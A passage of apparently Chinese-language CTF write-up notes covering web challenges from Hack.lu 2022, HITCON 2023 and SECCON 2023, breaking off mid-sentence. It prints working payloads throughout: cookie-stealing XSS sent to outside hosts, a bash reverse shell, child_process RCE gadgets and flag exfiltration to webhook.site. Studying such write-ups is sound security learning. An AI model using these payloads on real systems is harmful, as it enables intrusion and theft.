第一個利用了 HTML 會忽略在 style 裡的 &lt;!-- 但是 xhtml 不會來創造差異： &lt;body> &lt;style>a &#123; color: &lt;!--&#125;&lt;/style> &lt;img alt=\"-->&lt;/style>&lt;base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' />\"> &lt;/body> 第二個則是 DOMPurify 在偵測 mXSS 時會檢查 valid HTML tag，需要是 ASCII alphanumeric，但是 XML 其實允許更多字元： a&lt;style>&lt;ø:base id=\"giotino\" xmlns:ø=\"http://www.w3.org/1999/xhtml\" href=\"/**/=1;alert(document.cookie);//\" />&lt;/style> 所以在 HTML context 底下是沒問題的，但是在 xhtml 還是會被解析為是 base tag。 第三個看起來跟第一個類似，但第一個簡單許多，是這樣的： ff&lt;style>&lt;!--&lt;/style>&lt;a id=\"-->&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;!--\">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>-->&lt;/style> 以 HTML 來說就是一個 style + a tag + 兩個 style tag。但是以 xhtml 來說的話，會把 style 裡的 &lt;!-- --&gt; 也看作是註解，因此會變成： ff&lt;style>&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;/style> 從他想達成的效果來看，應該簡化成這樣也可以： ff&lt;style>&lt;!--&lt;/style>&lt;a id=\"-->&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;!--\">&lt;/a>&lt;style>-->&lt;/style>","link":"/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/"},{"title":"Hack. lu CTF 2022 筆記","text":"被 web 題電得亂七八糟，基本上什麼都沒解出來。題目的品質都很不錯，學到很多新東西，值得記錄一下。 關鍵字： Electron relaunch to RCE 利用 Python decorator 執行程式碼 透過特殊檔名讓 Apache 不輸出 content type header GIF + JS polyglot 繞過 SQLite 不合法欄位名稱 JS 註解 &lt;!-- superjson babyelectron(21 solves)給你一個 Electron 的 app，目標是 RCE，有一個 bot 會用 app 訪問你的頁面，然後要先找到一個 XSS，這段就先不提了。 這題該開的 security 設置都有開，關鍵是在 preload 裡面有一段這個： const RendererApi = &#123; invoke: (action, ...args) => &#123; return ipcRenderer.send(\"RELaction\",action, args); &#125;, &#125;; // SECURITY: expose a limted API to the renderer over the context bridge // https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3 contextBridge.exposeInMainWorld(\"api\", RendererApi); 在另外一個 JS 則有這樣一段： // In this file you can include the rest of your app's specific main process // code. You can also put them in separate files and require them here. app.RELbuy = function(listingId)&#123; return &#125; app.RELsell = function(houseId, price, duration)&#123; return &#125; app.RELinfo = function(houseId)&#123; return &#125; app.RElist = function(listingId)&#123; return &#125; app.RELsummary = function(userId)&#123; return &#125; ipcMain.on(\"RELaction\", (_e, action, args)=>&#123; //if([\"RELbuy\", \"RELsell\", \"RELinfo\"].includes(action))&#123; if(/^REL/i.test(action))&#123; app[action](...args) &#125;else&#123; // ?? &#125; &#125;) 看起來沒什麼用，因為那些方法都沒實作。 但重點是你送 relaunch 的指令進去也會 match 到，所以你可以執行 app.relaunch，在 relaunch 的時候可以指定執行檔位置，就可以 RCE。 DC 裡面 zeyu2001 提供的 payload： &#123; \"houseId\":\"...\", \"token\":\"...\", \"message\":\"&lt;img src=x onerror=\\\"window.api.invoke('relaunch',&#123;execPath: 'bash', args: ['-c', 'bash -i >&amp; /dev/tcp/HOST/PORT 0>&amp;1']&#125;)\\\">\", \"price\":\"\" &#125; Sudistark 的 writeup：https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md Culinary Class Room(6 solves)這題限制你只能幫一個 class 加上最多 250 個 decorators，而且不能有參數，目標是要能夠執行任意程式碼拿到 flag。 作者的解法是找到一個 list 然後往裡面 push 很多數字，最後丟到 bytes 以後再丟到 eval 去執行，例如說以下程式碼會往 copyright._Printer__filenames push 112 這個數字 @copyright._Printer__filenames.append @memoryview.__basicsize__.__sub__ @staticmethod.__basicsize__.__mul__ @object.__instancecheck__ class a:pass 底下是來自 Arusekk 在 DC 貼的 payload： @print @list @eval @bytes @copyright._Printer__filenames.__add__ @list @str.encode @chr @len @StopAsyncIteration.__doc__.format @copyright._Printer__filenames.append @len @OSError.__doc__.format @copyright._Printer__filenames.append @len @len.__doc__.format @copyright._Printer__filenames.extend @str.encode @int.real.__name__.strip @len.__name__.format @copyright._Printer__filenames.append @len @ValueError.__doc__.format @copyright._Printer__filenames.append @len @Exception.__doc__.format @copyright._Printer__filenames.append @len @OSError.__doc__.format @copyright._Printer__filenames.append @len @StopIteration.__doc__.format @copyright._Printer__filenames.extend @str.encode @open.__name__.format @copyright._Printer__filenames.append @len @set.__doc__.format @copyright._Printer__filenames.append @len @Exception.__doc__.format @copyright._Printer__filenames.extend @str.encode @__import__.__name__.__add__ @str @tuple @str.split @str.lower @OSError.__name__.rstrip @TypeError.__name__.format class room: ... 上面的就是在做： print(list(eval(b'__import__(\"os\",).popen(\"./rea*\")'))) 因為對 Python 極度不熟，所以來惡補一下。 __doc__ 可以拿到一個 method 的文件，要在 source code 裡面宣告，像這樣： def test(): \"\"\"hello\"\"\" print(test.__doc__) # hello 原來 Python 有這麼好用的功能，看起來在開發上滿實用的，要輸出成文件什麼的應該比較容易 然後在 Python 裡面可以用 __builtins__ 拿到內建的所有東西，感覺有點像是 js 的 global 那樣，可以看出有哪些東西可以用。 用 dir() 可以列出所有屬性，所以可以自己寫一個遞迴去找出 list，像這樣： visited = set() def search(obj, path): for name in dir(obj): item = getattr(obj, name) new_path = path + \".\" + name if (type(item) == list): print(new_path) return if type(item) not in visited: visited.add(type(item)) search(item, new_path) search(__builtins__, \"__builtins__\") 最後就會找到 __builtins__.copyright._Printer__filenames 這個存在於 global 的 list。 而上面貼的解法，找到數字之後用 @copyright._Printer__filenames.append 丟進去陣列，回傳值是 None，然後利用 &quot;abc&quot;.format(None) 還是 “abc” 的特性，就可以再把 input 變成想要的字串，然後用 len 去拿到數字。 YummyGIFs(5 solves)可以上傳一張 gif（有經過嚴格檢查，要真的是 gif 檔）並搭配標題跟敘述，敘述會過濾之後 render 在畫面上： function s($input_str) &#123; $allowed_tags = ['&lt;b>', '&lt;/b>', '&lt;i>', '&lt;/i>', '&lt;u>', '&lt;/u>', '&lt;s>', '&lt;/s>', '&lt;br>']; $current_str = $input_str; while (true) &#123; $new_str = preg_replace_callback('/&lt;.*?>/', function ($matches) use ($allowed_tags) &#123; return in_array($matches[0], $allowed_tags) ? $matches[0] : ''; &#125;, $current_str); if ($new_str === $current_str) &#123; return $new_str; &#125; $current_str = $new_str; &#125; &#125; 看起來很嚴格，但其實可以用未閉合的標籤繞過，像這樣：&lt;script src=&quot;&quot; p=&quot;，所以還是可以插入任意 tag。 接下來問題就是要怎麼讓 src 合法，因為有 CSP self 的關係，所以我們要產生出一個又是 GIF 但又是合法的 JS code，但儘管產出了，因為 content type 是 image&#x2F;gif，所以瀏覽器還是會報錯，會出現： Refused to execute script from ‘http://localhost:1234/a.gif‘ because its MIME type (‘image&#x2F;gif’) is not executable. 而解法就是想辦法不要輸出 content type 就好。 因為這個 content type 是 Apache 給的，可以用檔名來繞過，例如說檔名是 ..gif，就不會給 content type，可參考：https://twitter.com/YNizry/status/1582733545759330306 這招感覺滿值得筆記下來的。 至於怎麼產生 gif + js polyglot，可以參考：https://gist.github.com/ajinabraham/f2a057fb1930f94886a3 順便在這篇順便筆記一下 png 的：PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE ! foodAPI(4 solves)這題的核心程式碼就這一段： apiRouter.get(\"/food/:id\", async(ctx) => &#123; const id = helpers.getQuery(ctx, &#123; mergeParams: true &#125;); try &#123; const res = await Food.select(&#123;id: 'id', name: 'name'&#125;).where(id).all() ctx.response.body = res; &#125; catch (e) &#123; console.log(e) ctx.response.body = e.name &#125; &#125;); id 會是個 object，你有完全的掌控權，但是不支援 array 跟 nested object，只能傳單純的物件進去。 目標是 SQL injection。 這題是我看最久而且最認真的一題，直接開 Chrome debugger 進去 trace code，底下簡單講一下內部的運作。 首先會把你傳進去的 object 轉成底下這樣的形式： &#123; wheres: [ &#123;field: \"any\", opeator: \"=\", value: \"123\"&#125;, &#123;field: \"name\", opeator: \"=\", value: \"hello\"&#125; ] &#125; 然後丟給 this._translator.translateToQuery 去產生出弄好的 SQL query，接著用神秘的字串分割去切，看有沒有 sub query，然後丟到 SQLite 裡面，部分程式碼如下： query(queryDescription: QueryDescription): Promise&lt;any | any[]> &#123; this._makeConnection(); const query = this._translator.translateToQuery(queryDescription); const subqueries = query.split(/;(?=(?:[^'\"]|'[^']*'|\"[^\"]*\")*$)/); const results = subqueries.map((subquery, index) => &#123; const preparedQuery = this._client.prepareQuery(subquery + \";\"); // ... &#125;) // ... &#125; 切字串的地方之前有出過事，改了之後也還是會出事，但在這題好像無關緊要：https://github.com/eveningkid/denodb/pull/241 這邊產生出來的 query 已經是完整的 SQL query 了，也就是說參數綁定這件事情並不是丟到 SQLite 去做，而是直接用 JS。 那這個完整的 SQL query 到底是怎麼出來的呢？ 首先，你的東西會被丟進 query builder 去，執行像這樣的東西： queryBuilder = queryBuilder.where( where.field, where.operator, where.value, ); // 回傳 queryBuilder.toString 而那個 queryBuilder.where 裡面，基本上就是根據你傳進來的東西去做事，例如說如果我傳：&#123;field:&quot;id&quot;, operator:&quot;=&quot;, value:&quot;hello&quot;&#125;，最後就會執行到： this._statements.push(&#123; grouping: 'where', type: 'whereBasic', column: \"id\", operator: \"=\", value: \"name\", not: this._not(), bool: this._bool(), asColumn: false, &#125;); 所以最後轉換成字串，就是根據這個 this._statements 去弄。 首先它會先根據你這些 where 組出語句來，怎麼個組法呢？就是把 column 用 backtick 包起來，然後把值變成 ?，像這樣： select * from `food` where `id`=? and `name`=? 這個所謂的「包起來」，程式碼在：https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274 產生完 SQL query 以後，開始做 data binding，程式碼大概是這樣：https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6 function formatQuery(sql, bindings, timeZone, client) &#123; bindings = bindings == null ? [] : [].concat(bindings); let index = 0; return sql.replace(/\\\\?\\?/g, (match) => &#123; if (match === '\\\\?') &#123; return '?'; &#125; if (index === bindings.length) &#123; return match; &#125; const value = bindings[index++]; return client._escapeBinding(value, &#123; timeZone &#125;); &#125;); &#125; 把 ? 取代成字串，然後取代之前會先 escape，escape 的內容就是外面加單引號，然後把字串本身的單引號變成兩個單引號。 看起來沒什麼問題，但是 deno 的 lib 忘記對欄位名稱的 ? 做 escape 了，所以如果你傳：&#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;，最後出來的 SQL 會是： select * from `food` where `id`=? and `?`=? 而 bind 完之後就會變成： select * from `food` where `id`='1' and `'A'`=? 你會發現 A 那邊可以做 SQL injection，只要先閉合那個反引號就行了。 但問題是這樣會產生不合法的欄位名稱，因為裡面一定有個單引號，像這樣： select * from `food` where `id`='1' and `'name`--'=? 會出現： Error: no such column: ‘name 當初做到這邊就卡住了，大概就兩條路： 有其他的漏洞沒注意到 有神奇的 SQLite 語法可以繞過不存在的欄位名稱 答案是後者。 底下這兩種都不會出錯： select id from food where `not_exist'` and 0 union select 1; select id from food where `not_exist'` in () union select 1; 不要問我為什麼，我也不知道，感覺是某種語法上的 bug（或 feature XD） 弄出 SQL injection 以後就弄個 time-based 的 query，然後用 xsleak 去測時間即可。或也可以像 terjanq 弄成 error-based 的，效率會再高一點。 其他人的 writeup: parrot https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98 terjanq https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436 kunte_ https://files.veryhax.ninja/solve-foodapi-hacklu22.html HTPL(3 solves)這題是一個自製的 AST，用 HTML 的方式來組合出 JS，例如說： &lt;x-str>hello&lt;x-str> 就會被翻譯成 &quot;hello&quot;。 目標是偷到 cookie，所以要能夠執行 XSS。這題看很久但沒什麼想法，我有想過是不是透過一些數學運算可以跳脫字串之類的，但沒找到 \\，想用註解也沒看到 * 可以用。 賽後發現想法近了，但忘記 HTML 的註解 &lt;!-- 也可以用。用小於 + not + 減法就可以湊出註解的符號，像這樣： &lt;x-program> &lt;x-lt> &lt;x-str>a&lt;/x-str> &lt;x-not> &lt;x-dec> &lt;x-identifier>1&lt;/x-identifier> &lt;/x-dec> &lt;/x-not> &lt;/x-lt> &lt;/x-program> 就會翻譯成： \"a\"&lt;!--$1$; 最後的分號會被弄掉，於是可以結合下一行的 [] 變成存取屬性，像這樣： &lt;x-program> &lt;x-const> &lt;x-identifier>a&lt;/x-identifier> &lt;x-lt> &lt;x-str>x&lt;/x-str> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>toString&lt;/x-str> &lt;/x-array> &lt;/x-program> 會翻譯成： const write = (s) => alert(s); const read = (s) => prompt(s); const $a$=\"x\"&lt;!--$asd$; [\"toString\"]; 也就是 const $a$=&quot;x&quot;[&quot;toString&quot;] 做到這邊好就簡單了，再繼續串下去拿到 function constructor 之後再呼叫即可，像這樣： &lt;x-program> &lt;x-const> &lt;x-identifier>a&lt;/x-identifier> &lt;x-lt> &lt;x-str>x&lt;/x-str> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>toString&lt;/x-str> &lt;/x-array> &lt;x-const> &lt;x-identifier>b&lt;/x-identifier> &lt;x-lt> &lt;x-identifier>a&lt;/x-identifier> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>constructor&lt;/x-str> &lt;/x-array> &lt;x-const> &lt;x-identifier>c&lt;/x-identifier> &lt;x-call> &lt;x-identifier>b&lt;/x-identifier> &lt;x-str>alert(\"xss\")&lt;/x-str> &lt;/x-call> &lt;/x-const> &lt;x-call> &lt;x-identifier>c&lt;/x-identifier> &lt;/x-call> &lt;/x-program> 會變成： const write = (s) => alert(s); const read = (s) => prompt(s); const $a$=\"x\"&lt;!--$asd$; [\"toString\"]; const $b$=$a$&lt;!--$asd$; [\"constructor\"]; const $c$=($b$)(\"alert(\\\"xss\\\")\"); ($c$)(); terjanq 的解法更短，直接利用 iframe + name 會拿到 window 的特性，去拿 iframe 裡的 eval（那個 if 拿掉也沒差）： &lt;iframe name=$win$>&lt;/iframe> &lt;x-program> &lt;x-if> &lt;x-num>1&lt;/x-num> &lt;x-const> &lt;x-identifier>test&lt;/x-identifier> &lt;x-lt> &lt;x-identifier>win&lt;/x-identifier> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>eval&lt;/x-str> &lt;/x-array> &lt;x-call> &lt;x-identifier>test&lt;/x-identifier> &lt;x-str>top.location='https://server/?c='+document.cookie&lt;/x-str> &lt;/x-call> &lt;/x-if> &lt;/x-program> 程式碼會是： const write = (s) => alert(s); const read = (s) => prompt(s); if(1)&#123; const $test$=$win$&lt;!--$asd$; [\"eval\"]; ($test$)(\"alert(1337)\"); &#125;; JaaSon(6 solves)同場加映一題 misc 的 JS 題，這題你可以給一個 json string，會被丟到 superjson 去。 用的雖然是有 prototype pollution 漏洞的版本，但是已經先用 Object.freeze(Object.prototype) 把 prototype 鎖起來，沒有 prototype pollution 可以用了。 這題還沒時間研究，但跟 superjson 內部運作的機制有關，可以透過 referentialEqualities 這東西去指定一些值，例如說： &#123; \"json\": &#123; \"brands\": [ &#123; \"name\": \"Sonar\" &#125; ], \"products\": [ &#123; \"name\": \"SonarQube\", \"brand\": null &#125; ] &#125;, \"meta\": &#123; \"referentialEqualities\": &#123; \"brands.0\": [\"products.0.brand\"] &#125; &#125; &#125; 就會執行 products[0].brand = brands[0];，看來應該是想透過這個解決 deep clone 時的 reference 問題。 詳情可以參考：Remote Code Execution via Prototype Pollution in Blitz.js，裡面解釋得比較完整。 其餘細節我就沒有再研究了，但看起來是透過這個功能把物件的一些東西換掉， 底下附上 szymex73 在 DC 貼的 payload： &#123; \"json\":[ [ null, [ &#123; \"value\":\"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())\" &#125; ] ] ], \"meta\":&#123; \"values\":&#123; \"2\":[ \"map\" ] &#125;, \"referentialEqualities\":&#123; \"constructor.prototype\":[ \"1\" ], \"find.constructor\":[ \"1.get\" ], \"push\":[ \"1.set\", \"1.delete\" ], \"pop\":[ \"1.next\", \"0.keys\", \"1.charAt\" ], \"2.constructor.prototype\":[ \"1.__proto__\", \"0.0\" ], \"0.2\":[ \"1.toString\" ], \"\":[ [ [ 1 ] ] ] &#125; &#125; &#125; 比起上面這個，我隊友 pew 的 payload 似乎比較好懂： const superjson = require('superjson').default; Object.freeze(Object.prototype); javascript = `console.log(process.mainModule.require('child_process').execSync(\"/readflag\").toString())` var json = JSON.stringify( &#123; json: &#123; real_error: &#123; \"message\": \"\", &#125;, real_map: [], fake_map: [\"\"], real_str: \"xxd\", real_arr: [], x: javascript, js: javascript, &#125;, meta: &#123; referentialEqualities: &#123; 'real_error.toString': ['fake_map.toString'], 'constructor.constructor': ['fake_map.get'], 'real_str.replace': ['fake_map.set'], 'js': ['fake_map.name'], 'real_arr.constructor.prototype.values': ['fake_map.keys'], 'real_map.__proto__' : ['fake_map.__proto__'], 'x': ['fake_map.0'] &#125;, values: &#123; real_map: [ \"map\" ], real_error: [ \"Error\" ] &#125; &#125;, &#125; ) console.log(json) console.log(\"\") 後記這次的題目都很有趣而且很新穎，例如說 Python 那題只用 decorator 做出任意程式碼執行就很酷，或是 foodAPI 直接考一個 denoDB 0-day，也是滿猛的。 SQLite 的神秘語法也是大開眼界，期待之後有人 po 出 write-up，從原始碼去解釋一下是哪一段有那個功能，到底是 feature 還是 bug。 而 HTPL 其實最後的考點還是 JS 的註解 &lt;!--，但被包裝起來以後就不是這麼容易發現，這種「拆開之後發現是自己熟悉的東西」，以題目來說我覺得滿理想的。 例如說像是 gif 那題，如果我沒解出來，我只會覺得我知識量不足，不知道 ..gif 可以繞，或覺得看 code 能力不足，沒辦法看太底層。但像是 HTPL 這題，沒解出來但發現原來知識點是自己知道的，就會覺得題目包裝得十分巧妙。 突然覺得跟以前一些競程的題目有點像，有些題目解不出來是因為我真的沒學過那演算法，但有些題目層層拆解之後發現不會太難，只是包裝得很好，就會覺得「哇，這出題者好猛」 話說 terjanq 在我心目中是 CTF 界中前端、瀏覽器以及 JS 相關題目的 GOAT，感覺只要是這類型的題目，他就一定解得出來，真的很猛。 當然，其他強者也不是蓋的，每次都會發現難題幾乎都是固定那幾個 id 解掉XD","link":"/2022/10/31/hacklu-ctf-2022-writeup/"},{"title":"HITCON CTF 2023 與 SECCON CTF 2023 筆記","text":"這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。 關鍵字列表： nim json, null byte nim request smuggling js-yaml web worker blob URL meta redirect file protocol &amp; .localhost domain sxg: Signed Exchanges 431 CSP bypass DOM clobbering document.body ejs delimiter Node.js + Deno prototye pollution gadget XSleaks golang sort HITCON CTF 2023最近好像很少看到每一題都低於 10 組解出來的 web 題了，上次有這種整場比賽幾乎都是 hard web 可能是 DiceCTF 吧？不過我覺得難度是其次，好玩有趣有學到新東西才是重點，而這些題目在我看來很顯然有做到這點。 先附上兩位作者的 writeup，底下提到作者 writeup 就不額外附連結了： https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/ https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023 兩個作者的 writeup 都寫得很詳細，我這邊只是看完之後記錄一些重點而已。 Login System (7 solves)這題有兩個 server，node.js 跟 nim，基本上大部分功能都是在 nim server 實現的，你可以登入、註冊以及修改密碼，而使用者的資料會存在 yaml 檔案裡面，目標是要達成 RCE。 第一個洞是 request smuggling，Node.js 接受 Transfer-Encoding: CHUNKED 但是 Nim 只看 chunk，可以利用這個差異來達成走私的目的。 但走私之後能幹嘛呢？ 第二個洞是 Nim 對於 JSON 的行為，先把一個欄位設成很大的數字，Nim 會把它當作是一個 RawNumber，在更新的時候就會不帶引號，可以利用這點來達成 JSON injection。 第三個洞是有了 JSON injection 之後就可以利用 js-yaml 的功能創造出一個有 JS function 的物件，最後利用這個物件會在渲染時呼叫 toString，就達成 RCE 了。 大概會像這樣： privilegeLevel: &#123; toString: !&lt;tag:yaml.org,2002:js/function> \"function ()&#123;console.log('hi')&#125;\" &#125; access: &#123;'profile': true, register: true, login: true&#125; 喔對了，還有一個洞是 Nim 的檔案讀取，檔名的部分可以用 null byte 截斷：test.yaml\\u0000 Canvas (4 solves)這題很有趣！ 簡單來講就是把你的程式碼丟到 worker 裡面去執行，在 worker 裡面有做一些防護措施，讓你不能存取到 globalThis。就算在 worker 取得了 XSS，從 worker 唯一能做的事情就是往 main thread postMessage，但是結果會經過 setHTML，被瀏覽器的 Sanitizer API 給過濾掉。 worker 的 sandbox 滿有趣的，大概像是這樣： function allKeys(obj) &#123; let keys = [] while (obj !== null) &#123; keys = keys.concat(Object.getOwnPropertyNames(obj)) keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj))) obj = Object.getPrototypeOf(obj) &#125; return [...new Set(keys)] &#125; function hardening() &#123; const fnCons = [function () &#123;&#125;, async function () &#123;&#125;, function* () &#123;&#125;, async function* () &#123;&#125;].map( f => f.constructor ) for (const c of fnCons) &#123; Object.defineProperty(c.prototype, 'constructor', &#123; get: function () &#123; throw new Error('Nope') &#125;, set: function () &#123; throw new Error('Nope') &#125;, configurable: false &#125;) &#125; const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons) for (const c of cons) &#123; Object.freeze(c) Object.freeze(c.prototype) &#125; &#125; const code = `console.log(1)` const argNames = allKeys(globalThis) const fn = Function(...argNames, code) const callUserFn = t => &#123; try &#123; fn.apply(Object.create(null)) &#125; catch (e) &#123; console.error('User function error', e) &#125; return true &#125; // hardening hardening() callUserFn() argNames 是搜集所有 global 能存取到的東西的名稱，這樣就可以把所有東西的名稱都當作是函式的參數丟進去，大概就像是底下這種感覺： function run(console, Object, String, Number, fetch,...) &#123; &#125; 於是你不管拿到什麼都會是 undefined，在呼叫時 this 也傳入了 Object.create(null)，所以沒辦法輕易跳出來。 Maple 的預期解是利用 try catch 加上錯誤去拿： try &#123; null.f() &#125; catch (e) &#123; TypeError = e.constructor &#125; Error = TypeError.prototype.__proto__.constructor Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace try&#123; null.f() &#125; catch(e) &#123; const g = e.stack[2].getFunction().arguments[0].target if (g) &#123; throw &#123; message: g &#125; &#125; &#125; 這招他之前在 DiceCTF 2022 - undefined 這題也用過類似的。 不過對於這題來說有個更容易的解法，利用 this 預設的特性，如下： function a() &#123; this.console.log('hello') &#125; a() 在 JavaScript 裡面，呼叫一個 function 時預設的 this 就會是 global，用這樣就可以繞過限制。 但繞過限制之後要幹嘛呢？在 worker 裡面拿到 XSS 之後好像做不了什麼事情，因為 main thread 的 setHTML 會做過濾，而且這題的 CSP 是 default-src &#39;self&#39; &#39;unsafe-eval&#39; 關鍵就在於 blob URL，可以用 blob 新建一個 HTML 並且載入，這個新 HTML 的 origin 跟原本的是一樣的： const u = this.URL.createObjectURL(new this.Blob(['&lt;h1>peko&lt;/h1>'], &#123; type: 'text/html' &#125;)) location = u 而這題讓我驚訝的地方是原來 &lt;meta&gt; 的跳轉也可以跳到 blob URL 去，所以結合 meta redirect 之後就可以把 top level page 變成是自己的 HTML，繞過 sanitizer 的限制。 但此時 CSP 會繼承，所以還是要繞過 CSP，這邊可以再次利用 worker.js，把 worker.js 當作是一般的 script 載入，就能夠在 main thread 底下執行 XSS 了。 這題真的很有趣，blob 的運用方式也很巧妙。 AMF (4 solves)有點懶得研究 python 的東西，就先放著吧，作者有寫 writeup。 Harmony (2 solves)這題各種 Electron 黑魔法。 在 Chromium 中 .localhost 結尾的 domain 在利用 file protocol 時會被忽略，例如說： &#x2F;&#x2F; fail file:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd &#x2F;&#x2F; success file:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd （我怎麼覺得以前我好像有無意間翻到過這一段的 code） 而 file:&#x2F;&#x2F; 會被 DOMPurify 濾掉，不過因為網頁本來就是 file，所以可以改成用 // 來繞過檢查。 接著，file:// 在 Electorn 裡面都是 same-origin，所以載入自己的檔案以後就可以存取到 top.api 最後再結合一些 prototype pollution 的東西，就可以拿到 RCE（後半段我沒有仔細研究，可參考作者的 writeup） Sharer’s World (1 solve)這題的關鍵是一個叫做 SXG 的東西：https://web.dev/signed-exchanges/ 在這場比賽以前我完全沒聽過這個，而且 web.dev 上的參考資料居然 2021 就有了，看來我真的是 lag 太久了。 簡單來講呢，SXG 就是可以拿憑證對一個網頁做簽章，如此一來其他網站在發送這個簽過章的資源時，瀏覽器就可以把這個資源視為是有憑證的那個網站。 舉個例子，今天 example.com 的人拿著他們的私鑰對一個網站簽名，產生了一個 example.sxg 檔案，接著我拿到了這個檔案，放到我的主機上，網址是：https://huli.tw/example.sxg 當使用者造訪 https://huli.tw/example.sxg 時，內容會是之前的網站，而網址會變成 example.com，就好像這個網頁是直接從 example.com 出來的一樣。 SECCON CTF 2023身為一個 JavaScript 愛好者，這次的 SECCON CTF 的題目我很喜歡，充滿了一堆的 JavaScript。雖然說有些題目沒解出來，但依舊學到很多。 Bad JWT (107 solves)這題的目標是要產出一個 isAdmin: true 的 JWT，而重點在於驗證 JWT 的邏輯： const algorithms = &#123; hs256: (data, secret) => base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()), hs512: (data, secret) => base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()), &#125; const createSignature = (header, payload, secret) => &#123; const data = `$&#123;stringifyPart(header)&#125;.$&#123;stringifyPart(payload)&#125;`; const signature = algorithms[header.alg.toLowerCase()](data, secret); return signature; &#125; 如果 header.alg 是 constructor，就會變成 const signature = Object(data,secret)，產出的結果會變成一個 string 的物件，而且裡面只含有 data，忽略了 secret： console.log(Object(\"data\", \"secret\")) // String &#123;'data'&#125; 因此只要根據這個構造一個相同的 signature 就好。 更詳細的 writeup 可以參考：https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023 SimpleCalc (23 solves)這題可以讓你執行任意 JavaScript，但是必須使用 fetch 加上 X-FLAG 這個 header 才能拿到 flag，可是會被 CSP 擋住： app.use((req, res, next) => &#123; const js_url = new URL(`http://$&#123;req.hostname&#125;:$&#123;PORT&#125;/js/index.js`); res.header('Content-Security-Policy', `default-src $&#123;js_url&#125; 'unsafe-eval';`); next(); &#125;); 只要製造出一個 header too large 的 response 並用 iframe 嵌入，就能得到一個沒有 CSP 的 same-origin 頁面，繞過 CSP： var f=document.createElement('iframe'); f.src = `http://localhost:3000/js/index.js?q=$&#123;'a'.repeat(20000)&#125;`; document.body.appendChild(f); f.onload = () => &#123; f.contentWindow.fetch('/flag', &#123; headers: &#123;'X-FLAG': 'a'&#125;, credentials:'include' &#125;) .then(res => res.text()) .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag) &#125; 有趣的是如果用 window.open 就不行，看賽後討論是有人說因為 window.open 會把錯誤頁面導到一個 chrome://error 之類的地方，所以 origin 會變成 null。 而這題的預期解其實是 service worker，在 http + localhost 底下是可以用 sw 的，靠著 service worker 把 CSP header 拿掉。 底下是 @DimasMaulana 的 exploit： from urllib.parse import quote target = \"http://localhost:3000\" webhook = \"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10\" rmcsp = \"\"\" self.addEventListener(\"fetch\", (ev) => &#123; console.log(ev) let headers = new Headers() headers.set(\"Content-Type\",\"text/html\") if (/\\/js\\//.test(ev.request.url))&#123; ev.respondWith(new Response(\"&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='\"\"\"+webhook+\"\"\"?'+await r.text()&#125;)&lt;/script>\",&#123;headers&#125;)) &#125; &#125;); console.log(\"registered2\") document = &#123;&#125; document.getElementById = ()=>&#123;return &#123;innerText:\"testing\"&#125;&#125; \"\"\" workerUrl = \"/js/index.js?expr=\"+quote(rmcsp) payload = \"navigator.serviceWorker.register('\"+workerUrl+\"');setInterval(()=>&#123;location='/js/test'&#125;,2000)\" print(payload) payload = target+\"/js/..%2f?expr=\"+quote(payload) blink (14 solves)這題的核心程式碼如下： const createBlink = async (html) => &#123; const sandbox = wrap( $(\"#viewer\").appendChild(document.createElement(\"iframe\")) ); // I believe it is impossible to escape this iframe sandbox... sandbox.sandbox = sandboxAttribute; sandbox.width = \"100%\"; sandbox.srcdoc = html; await new Promise((resolve) => (sandbox.onload = resolve)); const target = wrap(sandbox.contentDocument.body); target.popover = \"manual\"; const id = setInterval(target.togglePopover, 400); return () => &#123; clearInterval(id); sandbox.remove(); &#125;; &#125;; iframe 的地方沒辦法 